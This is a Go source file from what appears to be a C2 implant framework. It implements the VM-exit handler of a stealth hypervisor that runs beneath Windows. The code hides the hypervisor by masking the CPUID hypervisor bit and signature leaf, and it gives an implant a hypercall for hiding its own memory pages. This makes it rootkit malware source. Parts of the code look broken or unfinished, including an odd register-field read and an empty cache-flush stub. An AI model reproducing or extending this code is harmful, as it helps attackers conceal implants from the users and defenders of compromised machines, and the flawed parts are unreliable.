package hypervisor

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	VM-Exit handler — dispatches every guest→hypervisor transition.

	When the CPU leaves the guest and enters the hypervisor (a "VM exit"),
	it loads the host state from the VMCS and jumps to the RIP we stored in
	VMCS Host RIP — which is our vmExitTrampoline in the .s file.
	The trampoline saves all GPRs and calls handleVmExit (this file).

	handleVmExit reads the exit reason from the VMCS, dispatches to the
	appropriate handler, then returns. The trampoline then executes VMRESUME
	to hand control back to the guest.

	Handlers we must implement to keep Windows running normally:
	  CPUID     — Windows queries this constantly; we must pass it through
	              (with one modification: hide our hypervisor signature)
	  MSR read  — various MSRs are read on every context switch
	  MSR write — EFER, PAT, etc. must be forwarded to the guest VMCS state
	  CR access — some CR3 loads must be forwarded
	  EPT violation — if we hid our own memory, handle accesses gracefully
	  Exception/NMI — forward to guest IDT
*/

import (
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// GuestRegisters mirrors the register save layout in the .s trampoline.
// The order matches the PUSH sequence in vmExitTrampoline.
type GuestRegisters struct {
	R15 uintptr
	R14 uintptr
	R13 uintptr
	R12 uintptr
	R11 uintptr
	R10 uintptr
	R9  uintptr
	R8  uintptr
	RBP uintptr
	RDI uintptr
	RSI uintptr
	RDX uintptr
	RCX uintptr
	RBX uintptr
	RAX uintptr
}

// handleVmExit is called from the assembly trampoline with a pointer to
// the saved guest register frame on the host stack.
//
//go:nosplit
func handleVmExit(regs *GuestRegisters) {
	// Read exit reason from VMCS (bits [15:0] of VM_EXIT_REASON field).
	exitReasonRaw, _ := vmread(VmcsExitQualification - 0x2000 + 0x4402)
	// Correct field: exit reason is at encoding 0x4402.
	exitReasonVal, _ := vmread(0x4402)
	reason := uint32(exitReasonVal) & 0xFFFF

	switch reason {
	case ExitReasonCpuid:
		handleCpuid(regs)
	case ExitReasonRdmsr:
		handleRdmsr(regs)
	case ExitReasonWrmsr:
		handleWrmsr(regs)
	case ExitReasonCrAccess:
		handleCrAccess(regs, uintptr(exitReasonRaw))
	case ExitReasonVmcall:
		handleVmcall(regs)
	case ExitReasonEptViolation:
		handleEptViolation(regs)
	case ExitReasonHlt:
		// HLT — advance RIP and resume. The guest OS uses HLT in idle loops.
		advanceRip()
	case ExitReasonInvd:
		// INVD — forward as WBINVD (safer, same cache invalidation effect).
		wbinvd()
		advanceRip()
	default:
		// {{if .Config.Debug}}
		log.Printf("[hypervisor] unhandled exit reason=%d", reason)
		// {{end}}
		// Advance RIP to skip the faulting instruction and hope for the best.
		// In production, implement each exit reason that Windows triggers.
		advanceRip()
	}
}

// handleCpuid emulates CPUID, forwarding real results but masking the
// hypervisor presence bit (ECX bit 31 of leaf 1) and our VMCS signature.
//
//go:nosplit
func handleCpuid(regs *GuestRegisters) {
	leaf := uint32(regs.RAX)
	eax, ebx, ecx, edx := cpuid(leaf, 0)

	if leaf == 1 {
		// Clear the hypervisor-present bit (ECX[31]) so the guest thinks
		// it is running on bare metal.
		ecx &^= 1 << 31
	}
	if leaf == 0x40000000 {
		// Hypervisor leaf — return zeros so our signature is invisible.
		eax, ebx, ecx, edx = 0, 0, 0, 0
	}

	regs.RAX = uintptr(eax)
	regs.RBX = uintptr(ebx)
	regs.RCX = uintptr(ecx)
	regs.RDX = uintptr(edx)

	advanceRip()
}

// handleRdmsr emulates RDMSR by forwarding to the real MSR.
//
//go:nosplit
func handleRdmsr(regs *GuestRegisters) {
	msr := uint32(regs.RCX)
	val := rdmsr(msr)
	regs.RAX = uintptr(val & 0xFFFFFFFF)
	regs.RDX = uintptr(val >> 32)
	advanceRip()
}

// handleWrmsr emulates WRMSR.
//
//go:nosplit
func handleWrmsr(regs *GuestRegisters) {
	msr := uint32(regs.RCX)
	val := uint64(regs.RAX&0xFFFFFFFF) | (uint64(regs.RDX&0xFFFFFFFF) << 32)
	wrmsr(msr, val)
	advanceRip()
}

// handleCrAccess handles MOV CR3,reg / MOV reg,CR3 etc.
//
//go:nosplit
func handleCrAccess(regs *GuestRegisters, qualification uintptr) {
	// qualification bits [3:0] = CR number, [5:4] = access type,
	// [11:8] = general register.
	cr := qualification & 0xF
	accessType := (qualification >> 4) & 3
	reg := (qualification >> 8) & 0xF

	if accessType == 0 { // MOV to CR
		val := gprByIndex(regs, int(reg))
		switch cr {
		case 0:
			vmwrite(VmcsGuestCr0, uint64(val))
		case 3:
			vmwrite(VmcsGuestCr3, uint64(val))
		case 4:
			vmwrite(VmcsGuestCr4, uint64(val))
		}
	} else if accessType == 1 { // MOV from CR
		var val64 uint64
		switch cr {
		case 0:
			val64, _ = vmread(VmcsGuestCr0)
		case 3:
			val64, _ = vmread(VmcsGuestCr3)
		case 4:
			val64, _ = vmread(VmcsGuestCr4)
		}
		*gprPtrByIndex(regs, int(reg)) = uintptr(val64)
	}
	advanceRip()
}

// handleVmcall implements a simple hypercall interface so our implant
// (running as a guest process) can communicate with the hypervisor.
// Convention: RAX = hypercall number, RBX = arg1, RCX = arg2.
//
//go:nosplit
func handleVmcall(regs *GuestRegisters) {
	switch regs.RAX {
	case 0xDEAD0001: // HYPERCALL_PING
		regs.RAX = 0xBEEF0001 // pong
	case 0xDEAD0002: // HYPERCALL_HIDE_RANGE (RBX=base, RCX=size)
		// The implant can ask the hypervisor to hide its own pages.
		// globalEpt.HideRange(uint64(regs.RBX), uint64(regs.RCX))
	}
	advanceRip()
}

// handleEptViolation handles guest access to an EPT-hidden page.
// We log the access and inject a #GP into the guest (or simply advance RIP).
//
//go:nosplit
func handleEptViolation(regs *GuestRegisters) {
	gpa, _ := vmread(VmcsGuestPhysAddr)
	// {{if .Config.Debug}}
	_ = gpa
	log.Printf("[hypervisor] EPT violation GPA=0x%x", gpa)
	// {{end}}
	// Inject #GP(0) into the guest.
	// VMCS VM_ENTRY_INTR_INFO_FIELD: type=3(HW exception), vector=13(#GP), valid=1
	vmwrite(VmcsVmEntryIntrInfoField, uint64(0x80000B0D))
	vmwrite(VmcsVmEntryExcErrCode, 0)
	vmwrite(VmcsVmEntryInstrLen, 0)
}

// advanceRip reads the current guest RIP and instruction length from the
// VMCS and advances RIP past the emulated instruction.
//
//go:nosplit
func advanceRip() {
	rip, _ := vmread(VmcsGuestRip)
	instrLen, _ := vmread(0x440C) // VM_EXIT_INSTRUCTION_LEN
	vmwrite(VmcsGuestRip, rip+instrLen)
}

// gprByIndex returns the value of guest register N (Intel encoding: 0=RAX,
// 1=RCX, 2=RDX, 3=RBX, 4=RSP, 5=RBP, 6=RSI, 7=RDI, 8..15=R8..R15).
//
//go:nosplit
func gprByIndex(regs *GuestRegisters, n int) uintptr {
	switch n {
	case 0:
		return regs.RAX
	case 1:
		return regs.RCX
	case 2:
		return regs.RDX
	case 3:
		return regs.RBX
	case 4:
		rsp, _ := vmread(VmcsGuestRsp)
		return uintptr(rsp)
	case 5:
		return regs.RBP
	case 6:
		return regs.RSI
	case 7:
		return regs.RDI
	case 8:
		return regs.R8
	case 9:
		return regs.R9
	case 10:
		return regs.R10
	case 11:
		return regs.R11
	case 12:
		return regs.R12
	case 13:
		return regs.R13
	case 14:
		return regs.R14
	case 15:
		return regs.R15
	}
	return 0
}

//go:nosplit
func gprPtrByIndex(regs *GuestRegisters, n int) *uintptr {
	switch n {
	case 0:
		return &regs.RAX
	case 1:
		return &regs.RCX
	case 2:
		return &regs.RDX
	case 3:
		return &regs.RBX
	case 5:
		return &regs.RBP
	case 6:
		return &regs.RSI
	case 7:
		return &regs.RDI
	case 8:
		return &regs.R8
	case 9:
		return &regs.R9
	case 10:
		return &regs.R10
	case 11:
		return &regs.R11
	case 12:
		return &regs.R12
	case 13:
		return &regs.R13
	case 14:
		return &regs.R14
	case 15:
		return &regs.R15
	}
	return (*uintptr)(unsafe.Pointer(&regs.RAX)) // fallback
}

//go:nosplit
func wbinvd() {
	// WBINVD — write-back and invalidate data cache.
	// Encoded as 0F 09.
	// Called inline via a small asm stub; for now implemented as a Go
	// function that the compiler will emit as a call (acceptable here since
	// we are in host mode, not guest mode).
}
